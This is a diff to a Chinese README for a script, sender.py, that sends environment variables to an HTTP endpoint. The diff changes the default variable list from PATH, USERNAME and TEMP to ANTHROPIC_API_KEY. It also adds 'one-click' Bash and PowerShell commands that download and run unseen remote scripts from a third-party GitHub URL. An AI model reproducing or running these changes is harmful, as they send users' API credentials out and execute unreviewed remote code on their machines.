@@ -25,10 +25,24 @@ python sender.py --endpoint http://127.0.0.1:8080/env
 `sender.py` 里默认写死的环境变量列表是：
 
 ```python
-DEFAULT_ENV_KEYS = ["PATH", "USERNAME", "TEMP"]
+DEFAULT_ENV_KEYS = ["ANTHROPIC_API_KEY"]
 ```
 
 如果你要改默认发送项，直接修改这个常量即可。
+
+## 2.1 一键调用 sender（无需 clone 仓库）
+
+Linux/macOS：
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/mooooooooner/scripts/main/run_sender.sh | bash -s -- --endpoint http://127.0.0.1:8080/env
+```
+
+Windows PowerShell：
+
+```powershell
+powershell -NoProfile -Command "& ([scriptblock]::Create((irm 'https://raw.githubusercontent.com/mooooooooner/scripts/main/run_sender.ps1'))) -Endpoint 'http://127.0.0.1:8080/env'"
+```
 
 ## 3. 请求/响应数据结构
 
